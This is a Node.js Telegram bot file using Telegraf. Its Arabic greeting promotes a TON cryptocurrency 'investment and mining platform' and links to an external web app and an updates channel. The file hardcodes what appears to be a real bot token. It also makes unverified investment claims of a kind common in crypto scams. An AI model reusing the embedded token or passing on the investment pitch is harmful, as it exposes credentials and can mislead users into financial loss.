const { Telegraf } = require('telegraf');

const token = process.env.BOT_TOKEN || '8936364037:AAGF6X42O6Hl6pIn_QpHFmLJctXvuBLYbUY';
const bot = new Telegraf(token);

// إعدادات البوت مع رابط منصة التعدين الجاهز للعمل الفوري
bot.start((ctx) => {
  ctx.reply('أهلاً بك في منصة استثمار وتعدين عملة TON 💎\n\nاضغط على الزر أدناه لفتح لوحة التحكم والتعدين:', {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: '🚀 فتح منصة الاستثمار',
            web_app: { url: 'https://ton-investment-bot.github.io/app/' }
          }
        ],
        [
          {
            text: '📢 قناة التحديثات',
            url: 'https://t.me/MoneyVault10'
          }
        ]
      ]
    }
  });
});

// تشغيل البوت
bot.launch().then(() => {
  console.log('Telegram Bot started successfully!');
}).catch((err) => {
  console.error('Failed to start Telegram bot:', err);
});

// تفعيل الإغلاق الآمن
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
